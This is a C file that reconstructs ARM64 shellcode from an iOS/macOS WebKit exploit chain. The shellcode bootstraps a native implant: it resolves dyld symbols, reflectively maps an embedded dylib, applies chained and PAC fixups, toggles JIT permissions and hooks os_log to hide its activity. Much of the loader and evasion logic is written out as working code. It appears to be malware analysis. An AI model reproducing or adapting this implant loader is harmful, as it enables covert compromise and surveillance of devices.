/*
 * shellcode_source.c — Reconstructed source of the ARM64 shellcode
 * Original: final_payload_A_16434916_shellcode.bin (31308 bytes, position-independent)
 *
 * This shellcode is executed after the WebKit exploit gains code execution.
 * It bootstraps the native implant by:
 *   1. Walking dyld to resolve system function pointers
 *   2. Parsing Mach-O load commands to find code segments
 *   3. Mapping the embedded dylib into memory with proper permissions
 *   4. Applying chained fixups (pointer rebasing)
 *   5. Hooking logging functions to suppress os_log output
 *   6. Calling JSEvaluateScript to bridge back to JavaScript
 *   7. Spawning a worker thread to run the dylib's _process entrypoint
 *
 * All function calls go through resolved pointers — no direct SVC/syscalls.
 * Data section (strings) starts at offset 0x75E3.
 */

#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>
#include <mach-o/loader.h>

/* ═══════════════════════════════════════════════════════════════════════
 *  Forward declarations — resolved at runtime via dyld
 * ═══════════════════════════════════════════════════════════════════════ */

typedef void   *(*dlopen_fn)(const char *path, int mode);
typedef void   *(*dlsym_fn)(void *handle, const char *symbol);
typedef int     (*dlclose_fn)(void *handle);
typedef int     (*dladdr_fn)(const void *addr, void *info);
typedef char   *(*dlerror_fn)(void);
typedef void   *(*malloc_fn)(size_t size);
typedef void    (*free_fn)(void *ptr);
typedef int     (*pthread_create_fn)(pthread_t *, const pthread_attr_t *,
                                     void *(*)(void *), void *);
typedef int     (*getpid_fn)(void);
typedef int     (*proc_pidinfo_fn)(int pid, int flavor, uint64_t arg,
                                   void *buffer, int buffersize);
typedef kern_return_t (*vm_protect_fn)(vm_map_t, vm_address_t, vm_size_t,
                                       boolean_t, vm_prot_t);
typedef kern_return_t (*vm_allocate_fn)(vm_map_t, vm_address_t *, vm_size_t, int);
typedef kern_return_t (*vm_map_fn)(vm_map_t, vm_address_t *, vm_size_t,
                                   vm_address_t, int, mem_entry_name_port_t,
                                   vm_offset_t, boolean_t, vm_prot_t,
                                   vm_prot_t, vm_inherit_t);
typedef kern_return_t (*mach_make_memory_entry_fn)(vm_map_t, vm_size_t *,
                                                   vm_offset_t, vm_prot_t,
                                                   mach_port_t *, mach_port_t);
typedef void    (*sigaction_fn)(int, const struct sigaction *, struct sigaction *);
typedef void   *(*JSEvaluateScript_fn)(void *ctx, void *script, void *thisObj,
                                       void *sourceURL, int startingLine,
                                       void **exception);

/* ═══════════════════════════════════════════════════════════════════════
 *  Resolved function table — filled at runtime
 *  Stored in the shellcode's data section (offsets 0x7500+)
 * ═══════════════════════════════════════════════════════════════════════ */

typedef struct resolved_funcs {
    dlopen_fn           dlopen;
    dlsym_fn            dlsym;
    dlclose_fn          dlclose;
    dladdr_fn           dladdr;
    dlerror_fn          dlerror;
    vm_protect_fn       vm_protect;
    vm_allocate_fn      vm_allocate;
    vm_map_fn           vm_map;
    mach_make_memory_entry_fn mach_make_memory_entry;
    getpid_fn           getpid;
    proc_pidinfo_fn     proc_pidinfo;
    pthread_create_fn   pthread_create;
    malloc_fn           malloc;
    free_fn             free;
    sigaction_fn        sigaction;
    JSEvaluateScript_fn JSEvaluateScript;
    void               *kevent_id;
    void               *task_info;
    void               *sys_dcache_flush;
    void               *sys_icache_invalidate;
    void               *vm_region_64;
    void               *dyldVersionNumber;
} resolved_funcs_t;

/* ═══════════════════════════════════════════════════════════════════════
 *  Mach-O in-memory context
 * ═══════════════════════════════════════════════════════════════════════ */

typedef struct macho_ctx {
    uint8_t     *macho_header;       // +0:   pointer to mapped Mach-O
    uint64_t     pad1[9];
    uint64_t     text_slide;         // +80:  ASLR slide for __TEXT
    uint64_t     mapped_base;        // +88:  base of mapped region
    uint64_t     mapped_slide;       // +96:  slide applied to mapping
    uint64_t     pad2[5];
    uint64_t     linkedit_base;      // +136
    uint64_t     pad3[4];
    uint32_t     code_size;          // +168
    uint8_t      pad4[1303];
    uint8_t      flags[8];           // +1472: various boolean flags
    uint8_t      jsc_enabled;        // +1479
    uint8_t      pad5[8];
    void        *jsc_context;        // +1488
    void        *jsc_global;         // +1496
} macho_ctx_t;

/* ═══════════════════════════════════════════════════════════════════════
 *  Entry point (sub_0) — shellcode starts here
 * ═══════════════════════════════════════════════════════════════════════ */

extern int64_t bootstrap_main(int64_t stack_offset);           // sub_298

void _start(void) {                                            // sub_0
    int64_t result = bootstrap_main(-184);
    /* Return to caller via stack pivot */
    /* The -184 is the offset to saved return address on the exploited stack */
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Universal dispatch call (sub_5C) — called 168 times
 *  Routes all function calls through PAC-signed pointers
 * ═══════════════════════════════════════════════════════════════════════ */

int64_t dispatch_call(int64_t a1, int64_t a2,                  // sub_5C
                      int64_t a3, int64_t a4)
{
    /* PAC-aware indirect call dispatcher */
    /* Signs the function pointer, validates, and calls */
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Memory barriers (sub_200, sub_208)
 * ═══════════════════════════════════════════════════════════════════════ */

void memory_barrier_dsb(void) {                                // sub_200
    __asm__ volatile("dsb sy");
}

void memory_barrier_isb(void) {                                // sub_208
    __asm__ volatile("isb");
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Bootstrap main — resolves all function pointers and loads dylib
 *  This is the core function (3092 bytes)
 * ═══════════════════════════════════════════════════════════════════════ */

int64_t bootstrap_main(int64_t stack_frame) {                  // sub_298
    resolved_funcs_t funcs = {0};

    /*
     * Phase 1: Find dyld base address
     *   - Walk the stack to find return addresses
     *   - Use dladdr-like heuristics to locate dyld's Mach-O header
     *   - Verify magic (0xFEEDFACF) and look for __LINKEDIT segment
     */

    /* Phase 2: Resolve dlopen/dlsym from dyld */
    /* Find __dyld_dlsym or __dyld_dlsym_internal in dyld's symbol table */
    /* These are the bootstrap functions needed to resolve everything else */

    /* Phase 3: Resolve critical system functions */
    /* Using the resolved dlsym, load functions from: */

    /* From /usr/lib/system/libdyld.dylib: */
    funcs.dlopen    = (dlopen_fn)resolve("dlopen");
    funcs.dladdr    = (dladdr_fn)resolve("dladdr");
    funcs.dlclose   = (dlclose_fn)resolve("dlclose");
    funcs.dlerror   = (dlerror_fn)resolve("dlerror");
    funcs.task_info = resolve("task_info");
    funcs.sys_dcache_flush = resolve("sys_dcache_flush");
    funcs.sys_icache_invalidate = resolve("sys_icache_invalidate");

    /* Phase 4: Resolve Mach VM functions */
    funcs.vm_protect  = (vm_protect_fn)resolve("vm_protect");
    funcs.vm_allocate = (vm_allocate_fn)resolve("vm_allocate");
    funcs.vm_map      = (vm_map_fn)resolve("vm_map");
    funcs.mach_make_memory_entry =
        (mach_make_memory_entry_fn)resolve("mach_make_memory_entry");
    funcs.vm_region_64     = resolve("vm_region_64");
    funcs.getpid           = (getpid_fn)resolve("getpid");
    funcs.proc_pidinfo     = (proc_pidinfo_fn)resolve("proc_pidinfo");
    funcs.kevent_id        = resolve("kevent_id");
    funcs.dyldVersionNumber = resolve("dyldVersionNumber");

    /* Phase 5: Parse the embedded Mach-O dylib */
    /*
     * Walk load commands looking for:
     *   LC_SEGMENT_64 — map __TEXT, __DATA, __DATA_CONST, __LINKEDIT
     *   LC_DYLD_INFO_ONLY — find rebase/bind opcodes
     *   LC_DYLD_CHAINED_FIXUPS — apply chained fixup pointers
     *
     * For each segment:
     *   1. vm_allocate the target address range
     *   2. memcpy segment data from the shellcode's embedded blob
     *   3. vm_protect with correct permissions (RX for __TEXT, RW for __DATA)
     */

    /* Phase 6: Apply chained fixups */
    /* Process DYLD_CHAINED_FIXUPS to rebase all pointers in __DATA */
    /* This handles both regular rebases and authenticated (PAC) pointers */

    /* Phase 7: Flush instruction cache */
    funcs.sys_dcache_flush(text_base, text_size);
    funcs.sys_icache_invalidate(text_base, text_size);

    /* Phase 8: Resolve dylib's _start and call it */
    /* The mapped dylib exports _process as its entry point */

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Symbol resolution helpers
 * ═══════════════════════════════════════════════════════════════════════ */

int64_t find_segment_vmaddr(macho_ctx_t *ctx, int seg_index) { // sub_66BC
    /* Walk LC_SEGMENT_64 load commands to find the N-th __TEXT segment */
    struct mach_header_64 *hdr = (void *)ctx->macho_header;
    uint32_t ncmds = hdr->ncmds;
    uint8_t *cmd_ptr = (uint8_t *)(hdr + 1);
    int text_count = 0;

    for (uint32_t i = 0; i < ncmds; i++) {
        struct load_command *lc = (void *)cmd_ptr;
        if (lc->cmd == LC_SEGMENT_64) {
            if (text_count == seg_index) {
                struct segment_command_64 *seg = (void *)lc;
                return ctx->mapped_slide - ctx->text_slide + seg->vmaddr;
            }
            text_count++;
        }
        cmd_ptr += lc->cmdsize;
    }
    return 0;
}

int strcmp_local(const char *s1, const char *s2) {              // sub_4C18
    while (*s1 && *s1 == *s2) { s1++; s2++; }
    return *s1 - *s2;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Function resolver — finds symbols in loaded dylibs
 * ═══════════════════════════════════════════════════════════════════════ */

int64_t resolve_symbol(int64_t image_base,                     // sub_5FE8
                       char *symbol_name,
                       int64_t ctx,
                       int64_t *result_out)
{
    /*
     * Special handling for certain symbols:
     *
     * _pthread_create:
     *   Load from /usr/lib/system/libsystem_pthread.dylib
     *   Also resolve malloc/free from libsystem_c.dylib
     *   Store all three into the function table
     *   Return a wrapper function (sub_6194) that uses malloc to
     *   allocate thread arguments
     *
     * _asl_vlog, _asl_log:
     *   Hook these logging functions to suppress output
     *   Load from /usr/lib/system/libsystem_trace.dylib:
     *     _os_log_actual, _os_log_internal, _os_log_default
     *   Also resolve: vasprintf, _NSGetMachExecuteHeader, free
     *   Replace with stubs that return without logging
     *
     * Default:
     *   Strip leading underscore if present
     *   Resolve via dlsym from the image
     */

    /* Handle _pthread_create specially */
    if (ctx_flags_check && strcmp_local(symbol_name, "_pthread_create") == 0) {
        void *libpthread = dlopen("/usr/lib/system/libsystem_pthread.dylib", RTLD_LAZY);
        if (!libpthread) goto fail;

        void *real_pthread_create = dlsym(libpthread, "pthread_create");
        if (!real_pthread_create) goto fail;

        void *libc = dlopen("/usr/lib/system/libsystem_c.dylib", RTLD_LAZY);
        if (!libc) goto fail;

        void *real_malloc = dlsym(libc, "malloc");
        void *real_free   = dlsym(libc, "free");
        if (!real_malloc || !real_free) goto fail;

        /* Store resolved functions in data section */
        stored_pthread_create = real_pthread_create;
        stored_malloc = real_malloc;
        stored_free = real_free;

        /* Return wrapper that handles thread creation */
        *result_out = (int64_t)pthread_create_wrapper;
        return 0;
    }

    /* Default: strip underscore prefix and resolve */
    const char *name = (symbol_name[0] == '_') ? symbol_name + 1 : symbol_name;
    void *sym = dlsym(image_base, name);
    *result_out = (int64_t)sym;
    return sym ? 0 : 9502726;

fail:
    *result_out = 0;
    return 9502726;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Logging suppression — hooks os_log to prevent detection
 * ═══════════════════════════════════════════════════════════════════════ */

int64_t hook_logging_functions(char *symbol_name) {            // sub_68DC
    /*
     * When the dylib tries to import _asl_vlog or _asl_log,
     * we intercept and also hook the os_log family:
     *
     *   _os_log_actual   → replaced with no-op
     *   _os_log_internal → replaced with no-op
     *   _os_log_default  → replaced with dummy log object
     *
     * Also hooks:
     *   vasprintf → used for format string logging
     *   _NSGetMachExecuteHeader → returns the main executable header
     *   __oslogstring → log message formatting
     *   %{public}s → format specifier used in os_log
     *
     * This prevents the implant's activity from appearing in
     * Console.app or unified logging (log show).
     */

    if (strcmp_local(symbol_name, "_asl_vlog") == 0 ||
        strcmp_local(symbol_name, "_asl_log") == 0)
    {
        /* Resolve real os_log functions from libsystem_trace */
        void *trace = dlopen("/usr/lib/system/libsystem_trace.dylib", RTLD_LAZY);
        void *os_log_actual   = dlsym(trace, "_os_log_actual");
        void *os_log_internal = dlsym(trace, "_os_log_internal");
        void *os_log_default  = dlsym(trace, "_os_log_default");

        /* Resolve helpers from libsystem_c */
        void *libc = dlopen("/usr/lib/system/libsystem_c.dylib", RTLD_LAZY);
        void *vasprintf_fn = dlsym(libc, "vasprintf");
        void *getHeader   = dlsym(libc, "_NSGetMachExecuteHeader");
        void *free_fn     = dlsym(libc, "free");

        /* Install hooks — replace with no-op stubs */
        /* ... patch function pointers in the imported symbol table ... */

        return 0;
    }

    return 9502731;  /* not a logging function, skip */
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Chained fixup application (DYLD_CHAINED_FIXUPS)
 * ═══════════════════════════════════════════════════════════════════════ */

int64_t apply_chained_fixups(macho_ctx_t *ctx,                 // sub_6340
                             int64_t imports_table,
                             int64_t num_imports,
                             void *fixup_header,
                             int seg_index,
                             uint32_t page_offset)
{
    /*
     * Process DYLD_CHAINED_FIXUPS for a segment.
     *
     * Pointer format (64-bit, from fixup_header+6):
     *   Format 6: DYLD_CHAINED_PTR_64_OFFSET — standard rebase
     *   Format 2: DYLD_CHAINED_PTR_64        — with offset from image base
     *   Format 1: DYLD_CHAINED_PTR_ARM64E    — authenticated pointers (PAC)
     *
     * For each pointer in the chain:
     *   - If bit 63 set (bind): look up in imports table by ordinal
     *   - If bit 63 clear (rebase): compute new address from slide
     *   - Follow the chain via delta encoded in bits 51-62
     *   - Stop when delta == 0
     *
     * For ARM64e (format 1), authenticated pointers carry:
     *   - Diversity value
     *   - Key selector (IA, IB, DA, DB)
     *   - Address discriminator flag
     *   Used to re-sign pointers with correct PAC after relocation.
     */

    uint64_t *page_ptr = (uint64_t *)(ctx->mapped_base + page_offset);

    while (1) {
        uint64_t value = *page_ptr;
        uint64_t new_value;

        if (value & (1ULL << 63)) {
            /* Bind: index into imports table */
            uint32_t ordinal = value & 0xFFFFFF;
            if (ordinal >= num_imports) return 9568257;
            new_value = imports_table[ordinal] + (value >> 24 & 0xFF);
        } else {
            /* Rebase: apply slide */
            uint64_t target = (value & 0xFFFFFFFFF)
                | ((uint64_t)(uint8_t)(value >> 36) << 56);
            new_value = target + ctx->mapped_slide;
        }

        *page_ptr = new_value;

        /* Follow chain */
        uint32_t delta = (value >> 51) & 0xFFF;
        if (delta == 0) return 0;
        page_ptr += delta;
    }
}

/* ═══════════════════════════════════════════════════════════════════════
 *  JIT region manipulation (sub_6290)
 *  Toggles APRR JIT mask for write-then-execute
 * ═══════════════════════════════════════════════════════════════════════ */

int64_t jit_write_execute(uint64_t *region) {                  // sub_6290
    if (!region || !*region) return 0;

    /* Toggle JIT permissions via APRR */
    __asm__ volatile("msr S3_4_C15_C2_7, xzr");  /* APRR_JIT_MASK_EL2 = 0 */
    __asm__ volatile("isb");

    /* Execute the JIT'd code */
    int64_t result = dispatch_call(region[1], 0, 0, 0);

    /* Clear the region */
    memset(region, 0, 16);
    return result;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  JSEvaluateScript bridge — executes JS from native code
 * ═══════════════════════════════════════════════════════════════════════ */

int64_t execute_javascript(macho_ctx_t *ctx,                   // sub_54FC
                           int64_t dylib_state)
{
    if (!ctx || !dylib_state) return ERR_INVALID_ARG;
    if (!ctx->jsc_enabled) return 0;

    void *jsc_global = ctx->jsc_global;
    if (!jsc_global || !ctx->jsc_context) return ERR_INVALID_ARG;

    /* Resolve JSEvaluateScript from JavaScriptCore.framework */
    void *jsc_eval = NULL;
    int64_t err = resolve_from_framework(
        dylib_state,
        "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore",
        "JSEvaluateScript",
        &jsc_eval);
    if (err) return err;

    /* Install signal handler for crash recovery */
    struct sigaction sa = {0};
    /* sigaction(SIGSEGV, ...) — catches PAC failures during JS eval */

    /* Try up to 3 times with exponential backoff */
    for (int attempt = 0; attempt < 3; attempt++) {
        /* Map the dylib's code region with execute permissions */
        /* ... vm_allocate + memcpy + vm_protect(VM_PROT_READ|VM_PROT_EXECUTE) ... */

        /* Call JSEvaluateScript to run the JS payload */
        /* The JS code bootstraps the full implant via globalThis.vKTo89 */

        /* If successful, break; otherwise retry */
    }

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Dylib segment mapper
 * ═══════════════════════════════════════════════════════════════════════ */

int64_t map_macho_segments(macho_ctx_t *ctx,                   // sub_1440 + sub_1554
                           uint8_t *macho_data,
                           size_t macho_size)
{
    struct mach_header_64 *hdr = (void *)macho_data;

    /* Verify Mach-O magic */
    if (hdr->magic != MH_MAGIC_64) return -1;

    /* First pass: calculate total VM size needed */
    uint64_t vm_low = UINT64_MAX, vm_high = 0;
    uint8_t *cmd = (uint8_t *)(hdr + 1);
    for (uint32_t i = 0; i < hdr->ncmds; i++) {
        struct load_command *lc = (void *)cmd;
        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (void *)lc;
            if (seg->vmaddr < vm_low) vm_low = seg->vmaddr;
            if (seg->vmaddr + seg->vmsize > vm_high)
                vm_high = seg->vmaddr + seg->vmsize;
        }
        cmd += lc->cmdsize;
    }

    /* Allocate contiguous region */
    vm_address_t base = 0;
    kern_return_t kr = vm_allocate(mach_task_self(), &base,
                                   vm_high - vm_low, VM_FLAGS_ANYWHERE);
    if (kr) return kr;

    /* Second pass: copy each segment and set permissions */
    cmd = (uint8_t *)(hdr + 1);
    for (uint32_t i = 0; i < hdr->ncmds; i++) {
        struct load_command *lc = (void *)cmd;
        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (void *)lc;
            uint64_t dest = base + (seg->vmaddr - vm_low);

            /* Copy segment data */
            if (seg->filesize > 0)
                memcpy((void *)dest, macho_data + seg->fileoff, seg->filesize);

            /* Zero BSS */
            if (seg->vmsize > seg->filesize)
                memset((void *)(dest + seg->filesize), 0,
                       seg->vmsize - seg->filesize);

            /* Apply protections */
            vm_protect(mach_task_self(), dest, seg->vmsize, FALSE, seg->initprot);
        }
        cmd += lc->cmdsize;
    }

    /* Store mapping info in context */
    ctx->mapped_base = base;
    ctx->code_size = (uint32_t)(vm_high - vm_low);

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  PAC pointer signing helpers
 * ═══════════════════════════════════════════════════════════════════════ */

uint64_t pac_sign(uint64_t ptr, int key_type) {                // sub_6648
    switch (key_type) {
    case 0: /* IA */ __asm__("pacia %0, %1" : "+r"(ptr) : "r"(0)); break;
    case 1: /* IB */ __asm__("pacib %0, %1" : "+r"(ptr) : "r"(0)); break;
    case 2: /* DA */ __asm__("pacda %0, %1" : "+r"(ptr) : "r"(0)); break;
    default:        __asm__("pacdb %0, %1" : "+r"(ptr) : "r"(0)); break;
    }
    return ptr;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  String table (embedded at offset 0x75E3)
 * ═══════════════════════════════════════════════════════════════════════ */

/*
 * 0x75E3: "dlopen"
 * 0x75EB: "dladdr"
 * 0x75F2: "dlclose"
 * 0x75FA: "dlerror"
 * 0x7602: "_process"
 * 0x760B: "task_info"
 * 0x7615: "sys_dcache_flush"
 * 0x7626: "sys_icache_invalidate"
 * 0x763C: "_dlsym"
 * 0x7643: "/usr/lib/system/libdyld.dylib"
 * 0x7661: "__TEXT"
 * 0x7668: "__LINKEDIT"
 * 0x7673: "__dyld_dlsym_internal"
 * 0x7689: "__dyld_dlsym"
 * 0x7696: "dlsym"
 * 0x769C: "mach_eventlink_create"
 * 0x76B2: "dyldVersionNumber"
 * 0x76C4: "getpid"
 * 0x76CB: "proc_pidinfo"
 * 0x76D8: "vm_region_64"
 * 0x76E5: "vm_protect"
 * 0x76F0: "mach_make_memory_entry"
 * 0x7707: "vm_map"
 * 0x770E: "vm_allocate"
 * 0x771A: "kevent_id"
 * 0x7724: "__PAGEZERO"
 * 0x772F: "__DATA"
 * 0x7736: "__eh_frame"
 * 0x7741: "__unwind_info"
 * 0x7753: "__stubs"
 * 0x775B: "__auth_stubs"
 * 0x7768: "__objc_stubs"
 * 0x7775: "__internal"
 * 0x7780: "@rpath"
 * 0x7787: "/usr/lib/libobjc.A.dylib"
 * 0x77A0: "/usr/lib/system/libcache.dylib"
 * 0x77BF: "dyld_stub_binder"
 * 0x77D0: "__objc_empty_vtable"
 * 0x77E4: "_objc_readClassPair"
 * 0x77F8: "_pthread_create"
 * 0x7808: "/usr/lib/system/libsystem_pthread.dylib"
 * 0x7830: "pthread_create"
 * 0x783F: "/usr/lib/system/libsystem_c.dylib"
 * 0x7861: "malloc"
 * 0x7868: "free"
 * 0x786D: "_asl_vlog"
 * 0x7877: "_asl_log"
 * 0x7880: "/usr/lib/system/libsystem_trace.dylib"
 * 0x78A6: "_os_log_actual"
 * 0x78B5: "_os_log_internal"
 * 0x78C6: "_os_log_default"
 * 0x78D6: "vasprintf"
 * 0x78E0: "_NSGetMachExecuteHeader"
 * 0x78F8: "__oslogstring"
 * 0x7906: "%{public}s"
 * 0x7911: "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"
 * 0x7954: "JSEvaluateScript"
 * 0x7965: "sigaction"
 * 0x796F: "object_getClass"
 * 0x797F: "_objc_patch_root_of_class"
 * 0x7999: "_objc_map_images"
 * 0x79AA: "__text"
 * 0x79B1: "__AUTH_CONST"
 * 0x79BE: "__const"
 * 0x79C6: "__DATA_CONST"
 * 0x79D3: "objc_retainAutorelease"
 * 0x79EA: "_objc_flush_caches"
 * 0x79FD: "/usr/lib/libSystem.dylib"
 * 0x7A16: "_NSGetArgc"
 * 0x7A21: "_NSGetArgv"
 * 0x7A2C: "_NSGetEnviron"
 * 0x7A3A: "_NSGetProgname"
 */
